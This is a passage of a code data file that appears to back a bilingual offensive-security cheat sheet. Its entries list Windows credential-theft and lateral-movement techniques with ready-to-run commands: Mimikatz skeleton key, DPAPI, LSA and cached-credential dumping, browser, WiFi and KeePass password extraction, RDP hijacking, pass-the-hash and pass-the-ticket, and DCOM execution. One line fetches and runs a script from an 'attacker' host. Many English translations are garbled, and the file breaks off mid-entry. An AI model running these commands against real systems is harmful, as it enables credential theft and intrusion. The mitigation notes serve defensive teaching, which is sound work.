          { part: 'privilege::debug', explanation: { zh: '获取Debug权限', en: 'Obtain Debug Privilege' } , type: 'command' },
          { part: 'misc::skeleton', explanation: { zh: '植入Skeleton Key，密码为mimikatz', en: 'Implant Skeleton Key — the master password is "mimikatz"' } , type: 'command' }
        ]
      }
    ],
    tutorial: {
      overview: { zh: 'Mimikatz高级功能包括DCSync、黄金票据、白银票据等域持久化技术。', en: 'Mimikatz advanced features include DCSync, Golden Ticket, Silver Ticket, and other domain persistence techniques.' },
      vulnerability: { zh: '域控制器复制协议缺乏认证，Kerberos设计缺陷。', en: 'The domain controller replication protocol lacks authentication — a Kerberos design flaw.' },
      exploitation: { zh: '利用流程：1) 获取krbtgt哈希 2) 生成黄金票据 3) 持久化访问', en: 'Exploitationworkflow: 1) Obtainkrbtgthash 2) GenerateGolden Ticket 3) PersistenceAccess' },
      mitigation: { zh: '防御措施：1) 监控DCSync行为 2) 定期更换krbtgt密码 3) 启用PAM', en: 'Defenses: 1) Monitor DCSync behavior; 2) Regularly rotate the krbtgt password; 3) Enable PAM' },
      difficulty: 'expert'
    }
  },
  {
    id: 'browser-creds',
    name: { zh: '浏览器凭证提取', en: 'Browser Credential Extraction' },
    description: { zh: '从浏览器中提取保存的密码和Cookie', en: 'from BrowserMiddleExtractSave Password and Cookie' },
    category: { zh: '凭证窃取', en: 'Credential Theft' },
    subCategory: { zh: '浏览器', en: 'Browser' },
    tags: ['browser', 'credentials', 'chrome', 'firefox'],
    prerequisites: [{ zh: '用户权限', en: 'UsersPermission' }, { zh: '浏览器已保存密码', en: 'Browser already SavePassword' }],
    execution: [
      {
        title: { zh: 'Chrome密码提取', en: 'ChromePasswordExtract' },
        command: 'Get-ChildItem -Path "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data" | Copy-Item -Destination "C:\\temp\\Login Data"',
        description: { zh: '复制Chrome登录数据库', en: 'CopyChromeLoginDatabase' },
        platform: 'windows'
      },
      {
        title: { zh: 'Chrome Cookie提取', en: 'Chrome CookieExtract' },
        command: 'Get-ChildItem -Path "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Cookies" | Copy-Item -Destination "C:\\temp\\Cookies"',
        description: { zh: '复制Chrome Cookie数据库', en: 'CopyChrome CookieDatabase' },
        platform: 'windows'
      },
      {
        title: { zh: '使用SharpWeb', en: 'UseSharpWeb' },
        command: 'SharpWeb.exe --browser chrome',
        description: { zh: '使用SharpWeb提取浏览器凭证', en: 'UseSharpWebExtractBrowserCredentials' },
        platform: 'windows'
      },
      {
        title: { zh: '使用HackBrowserData', en: 'UseHackBrowserData' },
        command: 'hack-browser-data.exe -b chrome',
        description: { zh: '提取Chrome所有数据', en: 'ExtractChromeallData' },
        platform: 'all'
      }
    ],
    tutorial: {
      overview: { zh: '浏览器保存的密码和Cookie可被提取用于横向移动。', en: 'BrowserSave Password and CookieCan by Extract used for Lateral Movement.' },
      vulnerability: { zh: '浏览器使用DPAPI加密，用户登录后可解密。', en: 'BrowserUseDPAPIEncryption, UsersLoginAfterCanDecryption.' },
      exploitation: { zh: '利用流程：1) 定位浏览器数据文件 2) 复制数据库 3) 解密提取', en: 'Exploitation workflow: 1) Locate browser data files; 2) Copy the database; 3) Decrypt and extract' },
      mitigation: { zh: '防御措施：1) 不保存敏感密码 2) 使用主密码 3) 监控数据访问', en: 'Defenses: 1) Do not save sensitive passwords; 2) Use a master password; 3) Monitor data access' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'dpapi-creds',
    name: { zh: 'DPAPI凭证提取', en: 'DPAPI Credential Extraction' },
    description: { zh: '从DPAPI保护存储中提取凭证', en: 'Extract credentials from DPAPI-protected storage' },
    category: { zh: '凭证窃取', en: 'Credential Theft' },
    subCategory: 'DPAPI',
    tags: ['dpapi', 'credentials', 'windows'],
    prerequisites: [{ zh: '用户权限', en: 'UsersPermission' }, 'DPAPI master key'],
    execution: [
      {
        title: { zh: '枚举DPAPI凭据', en: 'EnumerationDPAPIcredentials' },
        command: 'Get-ChildItem -Path "$env:APPDATA\\Microsoft\\Credentials" -Force',
        description: { zh: '查找DPAPI保护的凭据文件', en: 'Find DPAPI-protected credential files' },
        platform: 'windows'
      },
      {
        title: { zh: '使用Mimikatz解密', en: 'UseMimikatzDecryption' },
        command: 'dpapi::cred /in:C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Credentials\\XXX',
        description: { zh: '解密DPAPI凭据', en: 'DecryptionDPAPIcredentials' },
        platform: 'windows'
      },
      {
        title: { zh: '获取Master Key', en: 'ObtainMaster Key' },
        command: 'sekurlsa::dpapi',
        description: { zh: '从内存获取DPAPI master key', en: 'from MemoryObtainDPAPI master key' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: 'DPAPI是Windows数据保护API，用于保护敏感数据。', en: 'DPAPI is the Windows Data Protection API, used to protect sensitive data.' },
      vulnerability: { zh: 'DPAPI密钥存储在内存中，可被提取。', en: 'DPAPIkeystorage in MemoryMiddle, Can by Extract.' },
      exploitation: { zh: '利用流程：1) 获取master key 2) 定位凭据文件 3) 解密', en: 'Exploitation workflow: 1) Obtain the master key; 2) Locate credential files; 3) Decrypt' },
      mitigation: { zh: '防御措施：1) 限制内存访问 2) 监控DPAPI调用 3) 使用Credential Guard', en: 'Defensemeasures: 1) RestrictMemoryAccess 2) MonitoringDPAPICall 3) UseCredential Guard' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'rdp-creds',
    name: { zh: 'RDP凭证提取', en: 'RDP Credential Extraction' },
    description: { zh: '提取保存的RDP连接密码', en: 'ExtractSave RDPConnectionPassword' },
    category: { zh: '凭证窃取', en: 'Credential Theft' },
    subCategory: 'RDP',
    tags: ['rdp', 'credentials', 'windows'],
    prerequisites: [{ zh: '用户权限', en: 'UsersPermission' }, { zh: '已保存RDP密码', en: 'already SaveRDPPassword' }],
    execution: [
      {
        title: { zh: '查找RDP文件', en: 'FindRDPFile' },
        command: 'Get-ChildItem -Path "$env:USERPROFILE\\Documents\\*.rdp" -Recurse',
        description: { zh: '查找RDP连接文件', en: 'FindRDPConnectionFile' },
        platform: 'windows'
      },
      {
        title: { zh: '提取RDP密码', en: 'ExtractRDPPassword' },
        command: 'cmdkey /list',
        description: { zh: '列出保存的凭据', en: 'ListSave credentials' },
        platform: 'windows'
      },
      {
        title: { zh: '使用Mimikatz', en: 'UseMimikatz' },
        command: 'dpapi::cred /in:C:\\Users\\user\\AppData\\Local\\Microsoft\\Credentials\\XXX',
        description: { zh: '解密RDP保存的密码', en: 'DecryptionRDPSave Password' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: 'RDP保存的密码存储在DPAPI保护的凭据管理器中。', en: 'RDP saved passwords are stored in the DPAPI-protected Credential Manager.' },
      vulnerability: { zh: 'RDP密码可被提取用于横向移动。', en: 'RDPPasswordCan by Extract used for Lateral Movement.' },
      exploitation: { zh: '利用流程：1) 查找RDP文件 2) 定位凭据 3) 解密密码', en: 'Exploitation workflow: 1) Find RDP files; 2) Locate credentials; 3) Decrypt passwords' },
      mitigation: { zh: '防御措施：1) 不保存RDP密码 2) 使用受限管理员模式', en: 'Defenses: 1) Do not save RDP passwords; 2) Use Restricted Admin mode' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'wifi-creds',
    name: { zh: 'WiFi凭证提取', en: 'WiFi Credential Extraction' },
    description: { zh: '提取保存的WiFi密码', en: 'ExtractSave WiFiPassword' },
    category: { zh: '凭证窃取', en: 'Credential Theft' },
    subCategory: 'WiFi',
    tags: ['wifi', 'credentials', 'windows'],
    prerequisites: [{ zh: '管理员权限', en: 'ManagementMemberPermission' }, { zh: '已连接WiFi', en: 'already ConnectionWiFi' }],
    execution: [
      {
        title: { zh: '列出WiFi配置文件', en: 'ListWiFiConfiguration File' },
        command: 'netsh wlan show profiles',
        description: { zh: '显示所有WiFi配置文件', en: 'DisplayallWiFiConfiguration File' },
        platform: 'windows'
      },
      {
        title: { zh: '提取WiFi密码', en: 'ExtractWiFiPassword' },
        command: 'netsh wlan show profile name="WiFi_Name" key=clear',
        description: { zh: '显示WiFi密码', en: 'DisplayWiFiPassword' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'netsh wlan show profile', explanation: { zh: '显示WiFi配置', en: 'DisplayWiFiConfiguration' } , type: 'command' },
          { part: 'name="WiFi_Name"', explanation: { zh: '指定WiFi名称', en: 'Specify WiFi name' } , type: 'parameter' },
          { part: 'key=clear', explanation: { zh: '以明文显示密码', en: 'with plaintextDisplayPassword' } , type: 'parameter' }
        ]
      }
    ],
    tutorial: {
      overview: { zh: 'Windows保存的WiFi密码可通过netsh命令提取。', en: 'WindowsSave WiFiPasswordCanthroughnetshCommandExtract.' },
      vulnerability: { zh: 'WiFi密码以明文存储，管理员可查看。', en: 'WiFi passwords are stored in plaintext and can be viewed by administrators.' },
      exploitation: { zh: '利用流程：1) 列出WiFi配置 2) 显示密码', en: 'Exploitationworkflow: 1) ListWiFiConfiguration 2) DisplayPassword' },
      mitigation: { zh: '防御措施：1) 使用企业认证 2) 定期更换密码', en: 'Defenses: 1) Use enterprise authentication (WPA2-Enterprise); 2) Rotate passwords regularly' },
      difficulty: 'beginner'
    }
  },
  {
    id: 'vault-creds',
    name: { zh: 'Windows Vault凭证', en: 'Windows Vault Credentials' },
    description: { zh: '从Windows凭据管理器提取凭证', en: 'from WindowscredentialsManagementToolExtract Credentials' },
    category: { zh: '凭证窃取', en: 'Credential Theft' },
    subCategory: 'Vault',
    tags: ['vault', 'credentials', 'windows'],
    prerequisites: [{ zh: '用户权限', en: 'UsersPermission' }, { zh: '已保存凭据', en: 'already Savecredentials' }],
    execution: [
      {
        title: { zh: '列出Vault凭据', en: 'ListVaultcredentials' },
        command: 'vaultcmd /list',
        description: { zh: '列出所有Vault', en: 'ListallVault' },
        platform: 'windows'
      },
      {
        title: { zh: '导出Vault凭据', en: 'ExportVaultcredentials' },
        command: 'vaultcmd /listcreds:"Windows Credentials" /all',
        description: { zh: '列出Windows凭据', en: 'ListWindowscredentials' },
        platform: 'windows'
      },
      {
        title: { zh: '使用Mimikatz', en: 'UseMimikatz' },
        command: 'sekurlsa::credman',
        description: { zh: '从内存提取凭据管理器密码', en: 'from MemoryExtractcredentialsManagementToolPassword' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: 'Windows凭据管理器存储各种应用密码。', en: 'WindowscredentialsManagementToolstorageEachApplicationPassword.' },
      vulnerability: { zh: '凭据存储在内存中，可被提取。', en: 'credentialsstorage in MemoryMiddle, Can by Extract.' },
      exploitation: { zh: '利用流程：1) 列出Vault 2) 提取凭据', en: 'Exploitationworkflow: 1) ListVault 2) Extractcredentials' },
      mitigation: { zh: '防御措施：1) 不保存敏感凭据 2) 使用Windows Hello', en: 'Defensemeasures: 1) not SaveSensitivecredentials 2) UseWindows Hello' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'keepass-dump',
    name: { zh: 'KeePass凭证提取', en: 'KeePass Credential Extraction' },
    description: { zh: '从KeePass数据库提取密码', en: 'from KeePassDatabaseExtractPassword' },
    category: { zh: '凭证窃取', en: 'Credential Theft' },
    subCategory: 'KeePass',
    tags: ['keepass', 'credentials', 'password-manager'],
    prerequisites: [{ zh: 'KeePass数据库文件', en: 'KeePassDatabaseFile' }, { zh: '主密码或内存转储', en: 'Master password or memory dump' }],
    execution: [
      {
        title: { zh: '查找KeePass数据库', en: 'FindKeePassDatabase' },
        command: 'Get-ChildItem -Path C:\\ -Filter "*.kdbx" -Recurse -ErrorAction SilentlyContinue',
        description: { zh: '搜索KeePass数据库文件', en: 'SearchKeePassDatabaseFile' },
        platform: 'windows'
      },
      {
        title: { zh: '内存提取主密码', en: 'Extract master password from memory' },
        command: '使用KeePassDump或KeeThief从内存提取主密码',
        description: { zh: '从KeePass进程内存提取', en: 'from KeePassProcessMemoryExtract' },
        platform: 'windows'
      },
      {
        title: { zh: '使用KeeThief', en: 'UseKeeThief' },
        command: 'powershell -exec bypass -c "IEX(New-Object Net.WebClient).downloadString(\'http://attacker/KeeThief.ps1\'); Get-KeePassPw',
        description: { zh: 'PowerShell提取KeePass密码', en: 'PowerShellExtractKeePassPassword' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: 'KeePass主密码可能存在于内存中。', en: 'The KeePass master password may reside in memory.' },
      vulnerability: { zh: 'KeePass在内存中保存解密后的数据。', en: 'KeePass in MemoryMiddleSaveDecryptionAfter Data.' },
      exploitation: { zh: '利用流程：1) 找到数据库文件 2) 提取主密码 3) 解密数据库', en: 'Exploitation workflow: 1) Find the database file; 2) Extract the master password; 3) Decrypt the database' },
      mitigation: { zh: '防御措施：1) 使用强主密码 2) 启用安全桌面 3) 定期更换密码', en: 'Defenses: 1) Use a strong master password; 2) Enable Secure Desktop; 3) Rotate passwords regularly' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'lsa-secrets',
    name: { zh: 'LSA Secrets提取', en: 'LSA Secrets Extraction' },
    description: { zh: '从LSA Secrets提取敏感数据', en: 'from LSA Secrets ExtractionSensitiveData' },
    category: { zh: '凭证窃取', en: 'Credential Theft' },
    subCategory: 'LSA',
    tags: ['lsa', 'secrets', 'windows'],
    prerequisites: [{ zh: 'SYSTEM权限', en: 'SYSTEMPermission' }],
    execution: [
      {
        title: { zh: '使用Mimikatz', en: 'UseMimikatz' },
        command: 'lsadump::secrets',
        description: { zh: '提取LSA Secrets', en: 'ExtractLSA Secrets' },
        platform: 'windows'
      },
      {
        title: { zh: '使用reg save', en: 'Usereg save' },
        command: 'reg save HKLM\\SECURITY security.hive\nreg save HKLM\\SYSTEM system.hive',
        description: { zh: '导出注册表hive离线分析', en: 'Export registry hives for offline analysis' },
        platform: 'windows'
      },
      {
        title: { zh: '使用Impacket', en: 'UseImpacket' },
        command: 'secretsdump.py -security security.hive -system system.hive LOCAL',
        description: { zh: '离线提取LSA Secrets', en: 'Extract LSA Secrets offline' },
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: { zh: 'LSA Secrets存储服务账户密码、缓存域密码等。', en: 'LSA SecretsstorageServiceAccountPassword, CacheDomainPassword etc..' },
      vulnerability: { zh: 'LSA Secrets可被SYSTEM权限用户提取。', en: 'LSA SecretsCan by SYSTEMPermissionUsersExtract.' },
      exploitation: { zh: '利用流程：1) 获取SYSTEM权限 2) 提取LSA Secrets', en: 'Exploitationworkflow: 1) ObtainSYSTEMPermission 2) ExtractLSA Secrets' },
      mitigation: { zh: '防御措施：1) 限制SYSTEM权限 2) 使用Credential Guard', en: 'Defensemeasures: 1) RestrictSYSTEMPermission 2) UseCredential Guard' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'cached-creds',
    name: { zh: '缓存凭证提取', en: 'Cached Credential Extraction' },
    description: { zh: '提取域缓存凭证', en: 'ExtractDomainCacheCredentials' },
    category: { zh: '凭证窃取', en: 'Credential Theft' },
    subCategory: { zh: '缓存', en: 'Cache' },
    tags: ['cached', 'credentials', 'domain'],
    prerequisites: [{ zh: 'SYSTEM权限', en: 'SYSTEMPermission' }, { zh: '域环境', en: 'DomainEnvironment' }],
    execution: [
      {
        title: { zh: '使用Mimikatz', en: 'UseMimikatz' },
        command: 'lsadump::cache',
        description: { zh: '提取缓存域凭证', en: 'ExtractCacheDomainCredentials' },
        platform: 'windows'
      },
      {
        title: { zh: '使用reg save', en: 'Usereg save' },
        command: 'reg save HKLM\\SECURITY security.hive',
        description: { zh: '导出SECURITY hive', en: 'ExportSECURITY hive' },
        platform: 'windows'
      },
      {
        title: { zh: '离线破解', en: 'Offline cracking' },
        command: '使用hashcat破解缓存的域凭证',
        description: { zh: '缓存凭证可离线破解', en: 'Cached credentials can be cracked offline' },
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: { zh: 'Windows缓存域用户凭证以便离线登录。', en: 'Windows caches domain user credentials to enable offline logon.' },
      vulnerability: { zh: '缓存凭证可被提取和破解。', en: 'CacheCredentialsCan by Extract and Crack.' },
      exploitation: { zh: '利用流程：1) 提取缓存凭证 2) 离线破解', en: 'Exploitation workflow: 1) Extract cached credentials; 2) Crack offline' },
      mitigation: { zh: '防御措施：1) 减少缓存数量 2) 使用强密码', en: 'Defenses: 1) Reduce the cached credentials count; 2) Use strong passwords' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'lateral-winrm',
    name: { zh: 'WinRM横向移动', en: 'WinRM Lateral Movement' },
    description: { zh: '通过WinRM进行横向移动', en: 'throughWinRM perform Lateral Movement' },
    category: { zh: '横向移动', en: 'Lateral Movement' },
    subCategory: 'WinRM',
    tags: ['winrm', 'lateral', 'powershell'],
    prerequisites: [{ zh: 'WinRM启用', en: 'WinRMEnable' }, { zh: '有效凭证', en: 'EffectiveCredentials' }],
    execution: [
      {
        title: { zh: 'PowerShell远程', en: 'PowerShellRemote' },
        command: 'Enter-PSSession -ComputerName target -Credential $cred',
        description: { zh: 'PowerShell远程会话', en: 'PowerShell Remote Session' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'Enter-PSSession', explanation: { zh: '进入远程PowerShell会话', en: 'Enter a remote PowerShell session' } , type: 'command' },
          { part: '-ComputerName target', explanation: { zh: '目标计算机名', en: 'TargetComputersname' } , type: 'parameter' },
          { part: '-Credential $cred', explanation: { zh: '凭据对象', en: 'credentials for Object' } , type: 'parameter' }
        ]
      },
      {
        title: { zh: '执行命令', en: 'Execute Command' },
        command: 'Invoke-Command -ComputerName target -ScriptBlock { whoami } -Credential $cred',
        description: { zh: '远程执行命令', en: 'Remote Command Execution' },
        platform: 'windows'
      },
      {
        title: 'evil-winrm',
        command: 'evil-winrm -i target -u user -p password',
        description: { zh: '使用evil-winrm连接', en: 'Useevil-winrmConnection' },
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: { zh: 'WinRM是Windows远程管理协议，可用于横向移动。', en: 'WinRM is WindowsRemoteManagementProtocol, Can used for Lateral Movement.' },
      vulnerability: { zh: 'WinRM默认启用，接受明文凭据。', en: 'WinRM is enabled by default and accepts plaintext credentials.' },
      exploitation: { zh: '利用流程：1) 确认WinRM启用 2) 使用有效凭证连接', en: 'Exploitationworkflow: 1) ConfirmWinRMEnable 2) UseEffectiveCredentialsConnection' },
      mitigation: { zh: '防御措施：1) 限制WinRM访问 2) 使用证书认证 3) 监控日志', en: 'Defensemeasures: 1) RestrictWinRMAccess 2) UseCertificate Authentication 3) MonitoringLog' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'lateral-dcom',
    name: { zh: 'DCOM横向移动', en: 'DCOM Lateral Movement' },
    description: { zh: '通过DCOM进行横向移动', en: 'throughDCOM perform Lateral Movement' },
    category: { zh: '横向移动', en: 'Lateral Movement' },
    subCategory: 'DCOM',
    tags: ['dcom', 'lateral', 'com'],
    prerequisites: [{ zh: 'DCOM启用', en: 'DCOMEnable' }, { zh: '有效凭证', en: 'EffectiveCredentials' }],
    execution: [
      {
        title: 'MMC20.Application',
        command: '$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","target"))\n$com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c whoami","7")',
        description: { zh: '通过MMC DCOM执行命令', en: 'throughMMC DCOMExecute Command' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'MMC20.Application', explanation: { zh: 'MMC COM对象', en: 'MMC COM for Object' } , type: 'value' },
          { part: 'ExecuteShellCommand', explanation: { zh: '执行Shell命令方法', en: 'ExecuteShellCommandMethod' } , type: 'function' },
          { part: '"7"', explanation: { zh: '窗口状态参数', en: 'Window state parameter' } , type: 'value' }
        ]
      },
      {
        title: 'ShellBrowserWindow',
        command: '$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","target"))\n$com.Document.Application.ShellExecute("cmd.exe","/c whoami","c:\\windows\\system32",$null,0)',
        description: { zh: '通过ShellBrowserWindow执行', en: 'throughShellBrowserWindowExecute' },
        platform: 'windows'
      },
      {
        title: 'Excel DCOM',
        command: '$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","target"))\n$com.DisplayAlerts = $false\n$com.DDEInitiate("cmd","/c calc.exe")',
        description: { zh: '通过Excel DCOM执行', en: 'throughExcel DCOMExecute' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: 'DCOM允许远程创建COM对象并执行代码。', en: 'DCOMAllowRemoteCreateCOM for Object and ExecuteCode.' },
      vulnerability: { zh: '某些COM对象允许执行系统命令。', en: 'Certain COM objects allow execution of system commands.' },
      exploitation: { zh: '利用流程：1) 枚举可用COM对象 2) 远程创建实例 3) 执行命令', en: 'Exploitation workflow: 1) Enumerate usable COM objects; 2) Create remote instances; 3) Execute commands' },
      mitigation: { zh: '防御措施：1) 限制DCOM远程访问 2) 禁用危险COM对象', en: 'Defensemeasures: 1) RestrictDCOMRemoteAccess 2) DisableDangerousCOM for Object' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'lateral-ssh',
    name: { zh: 'SSH横向移动', en: 'SSH Lateral Movement' },
    description: { zh: '通过SSH进行横向移动', en: 'throughSSH perform Lateral Movement' },
    category: { zh: '横向移动', en: 'Lateral Movement' },
    subCategory: 'SSH',
    tags: ['ssh', 'lateral', 'linux'],
    prerequisites: [{ zh: 'SSH服务', en: 'SSHService' }, { zh: '有效凭证', en: 'EffectiveCredentials' }],
    execution: [
      {
        title: { zh: 'SSH连接', en: 'SSHConnection' },
        command: 'ssh user@target',
        description: { zh: '基础SSH连接', en: 'BasicSSHConnection' },
        platform: 'linux'
      },
      {
        title: { zh: 'SSH密钥认证', en: 'SSHkeyAuthentication' },
        command: 'ssh -i private_key user@target',
        description: { zh: '使用私钥连接', en: 'Useprivate keyConnection' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: '-i private_key', explanation: { zh: '指定私钥文件', en: 'specifiedprivate keyFile' } , type: 'parameter' },
          { part: 'user@target', explanation: { zh: '用户名和目标地址', en: 'Username and TargetAddress' } , type: 'value' }
        ]
      },
      {
        title: { zh: 'SSH跳板', en: 'SSH jump host' },
        command: 'ssh -J jump_host user@target',
        description: { zh: '通过跳板机连接', en: 'Connect through a jump host' },
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: { zh: 'SSH是Linux环境常用的远程管理协议。', en: 'SSH is LinuxEnvironmentCommon RemoteManagementProtocol.' },
      vulnerability: { zh: '弱密码、密钥泄露、配置不当。', en: 'Weak passwords, key leakage, or misconfiguration.' },
      exploitation: { zh: '利用流程：1) 发现SSH服务 2) 尝试凭证 3) 连接执行', en: 'Exploitationworkflow: 1) DiscoverSSHService 2) AttemptCredentials 3) ConnectionExecute' },
      mitigation: { zh: '防御措施：1) 禁用密码认证 2) 使用密钥 3) 限制用户', en: 'Defensemeasures: 1) DisablePasswordAuthentication 2) Usekey 3) RestrictUsers' },
      difficulty: 'beginner'
    }
  },
  {
    id: 'rdp-hijack',
    name: { zh: 'RDP会话劫持', en: 'RDP Session Hijacking' },
    description: { zh: '劫持已存在的RDP会话', en: 'Hijacking already has RDPSession' },
    category: { zh: '横向移动', en: 'Lateral Movement' },
    subCategory: 'RDP',
    tags: ['rdp', 'hijack', 'session'],
    prerequisites: [{ zh: 'SYSTEM权限', en: 'SYSTEMPermission' }, { zh: '存在RDP会话', en: 'hasRDPSession' }],
    execution: [
      {
        title: { zh: '列出会话', en: 'ListSession' },
        command: 'query user',
        description: { zh: '列出所有用户会话', en: 'ListallUsersSession' },
        platform: 'windows'
      },
      {
        title: { zh: '劫持会话', en: 'HijackingSession' },
        command: 'tscon SESSION_ID /dest:console',
        description: { zh: '劫持指定会话', en: 'HijackingspecifiedSession' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'tscon', explanation: { zh: '终端服务连接命令', en: 'Terminal service connection command' } , type: 'command' },
          { part: 'SESSION_ID', explanation: { zh: '目标会话ID', en: 'TargetSessionID' } , type: 'variable' },
          { part: '/dest:console', explanation: { zh: '连接到当前控制台', en: 'Connect to the current console session' } , type: 'parameter' }
        ]
      },
      {
        title: { zh: '使用Mimikatz', en: 'UseMimikatz' },
        command: 'ts::sessions\nts::remote /id:SESSION_ID',
        description: { zh: '使用Mimikatz劫持', en: 'UseMimikatzHijacking' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: 'RDP会话劫持可以接管其他用户的桌面会话。', en: 'RDP session hijacking can take over another user\'s desktop session.' },
      vulnerability: { zh: 'SYSTEM权限可以连接任意会话。', en: 'SYSTEM privileges allow connecting to any session.' },
      exploitation: { zh: '利用流程：1) 获取SYSTEM权限 2) 列出会话 3) 劫持会话', en: 'Exploitation workflow: 1) Obtain SYSTEM privileges; 2) List sessions; 3) Hijack the target session' },
      mitigation: { zh: '防御措施：1) 限制本地登录 2) 监控会话连接 3) 使用锁屏策略', en: 'Defenses: 1) Restrict local logon; 2) Monitor session connections; 3) Enforce screen lock policies' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'overpass-the-hash',
    name: 'Overpass-the-Hash',
    description: { zh: '使用哈希获取Kerberos票据', en: 'Using HashObtainKerberosTicket' },
    category: { zh: '横向移动', en: 'Lateral Movement' },
    subCategory: 'PtH',
    tags: ['pth', 'kerberos', 'hash'],
    prerequisites: [{ zh: '用户NTLM哈希', en: 'UsersNTLMhash' }, { zh: '域环境', en: 'DomainEnvironment' }],
    execution: [
      {
        title: 'Mimikatz',
        command: 'sekurlsa::pth /user:Administrator /domain:domain.com /ntlm:HASH /ptt',
        description: { zh: '使用哈希获取Kerberos票据', en: 'Using HashObtainKerberosTicket' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'sekurlsa::pth', explanation: { zh: 'Pass-the-Hash模块', en: 'Pass-the-HashModule' } , type: 'command' },
          { part: '/ntlm:HASH', explanation: { zh: '用户NTLM哈希', en: 'UsersNTLMhash' } , type: 'parameter' },
          { part: '/ptt', explanation: { zh: 'Pass-the-Ticket，注入票据', en: 'Pass-the-Ticket, InjectionTicket' } , type: 'parameter' }
        ]
      },
      {
        title: 'Rubeus',
        command: 'Rubeus.exe asktgt /user:Administrator /domain:domain.com /rc4:HASH /ptt',
        description: { zh: '使用Rubeus获取票据', en: 'UseRubeusObtainTicket' },
        platform: 'windows'
      },
      {
        title: 'Impacket',
        command: 'getTGT.py domain.com/user -hashes :HASH',
        description: { zh: '获取Kerberos票据', en: 'ObtainKerberosTicket' },
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: { zh: 'Overpass-the-Hash使用NTLM哈希获取Kerberos票据。', en: 'Overpass-the-HashUseNTLMhashObtainKerberosTicket.' },
      vulnerability: { zh: 'Kerberos可以使用NTLM哈希获取TGT。', en: 'KerberoscanUseNTLMhashObtainTGT.' },
      exploitation: { zh: '利用流程：1) 获取用户哈希 2) 请求Kerberos票据 3) 注入使用', en: 'Exploitationworkflow: 1) ObtainUsershash 2) RequestKerberosTicket 3) InjectionUse' },
      mitigation: { zh: '防御措施：1) 监控异常票据请求 2) 使用智能卡 3) 限制哈希访问', en: 'Defenses: 1) Monitor anomalous ticket requests; 2) Use smart cards; 3) Restrict hash access' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'pass-the-ticket',
    name: 'Pass-the-Ticket',
    description: { zh: '使用Kerberos票据进行横向移动', en: 'UseKerberosTicket perform Lateral Movement' },
    category: { zh: '横向移动', en: 'Lateral Movement' },
    subCategory: 'PtT',
    tags: ['ptt', 'kerberos', 'ticket'],
    prerequisites: [{ zh: '有效Kerberos票据', en: 'EffectiveKerberosTicket' }],
    execution: [
      {
        title: { zh: '导出票据', en: 'Export Tickets' },
        command: 'sekurlsa::tickets /export',
        description: { zh: '从内存导出Kerberos票据', en: 'from MemoryExportKerberosTicket' },
        platform: 'windows'
      },
      {
        title: { zh: '注入票据', en: 'InjectionTicket' },
        command: 'kerberos::ptt ticket.kirbi',
        description: { zh: '注入票据到当前会话', en: 'InjectionTicket to currentSession' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'kerberos::ptt', explanation: { zh: 'Pass-the-Ticket模块', en: 'Pass-the-TicketModule' } , type: 'command' },
          { part: 'ticket.kirbi', explanation: { zh: 'Kerberos票据文件', en: 'KerberosTicketFile' } , type: 'path' }
        ]
      },
      {
        title: { zh: 'Rubeus导入', en: 'RubeusImport' },
        command: 'Rubeus.exe ptt /ticket:base64ticket',
        description: { zh: '使用Rubeus注入票据', en: 'UseRubeusInjectionTicket' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: 'Kerberos票据可以被提取和重用。', en: 'Kerberos tickets can be extracted and reused.' },
      vulnerability: { zh: 'Kerberos票据在有效期内可被重用。', en: 'Kerberos tickets can be reused within their validity period.' },
      exploitation: { zh: '利用流程：1) 提取票据 2) 转移票据 3) 注入使用', en: 'Exploitation workflow: 1) Extract tickets; 2) Transfer tickets; 3) Inject and use' },
      mitigation: { zh: '防御措施：1) 缩短票据有效期 2) 监控票据使用 3) 使用PAC验证', en: 'Defenses: 1) Shorten ticket lifetime; 2) Monitor ticket usage; 3) Enable PAC validation' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'lateral-smbexec',
    name: { zh: 'SMBExec横向移动', en: 'SMBExec Lateral Movement' },
    description: { zh: '通过SMB执行命令', en: 'throughSMBExecute Command' },
    category: { zh: '横向移动', en: 'Lateral Movement' },
    subCategory: 'SMB',
    tags: ['smb', 'lateral', 'exec'],
    prerequisites: [{ zh: 'SMB访问权限', en: 'SMBAccessPermission' }, { zh: '管理员权限', en: 'ManagementMemberPermission' }],
    execution: [
      {
        title: 'Impacket smbexec',
        command: 'smbexec.py domain/user:password@target',
        description: { zh: '使用smbexec执行命令', en: 'UsesmbexecExecute Command' },
        platform: 'linux'
      },
      {
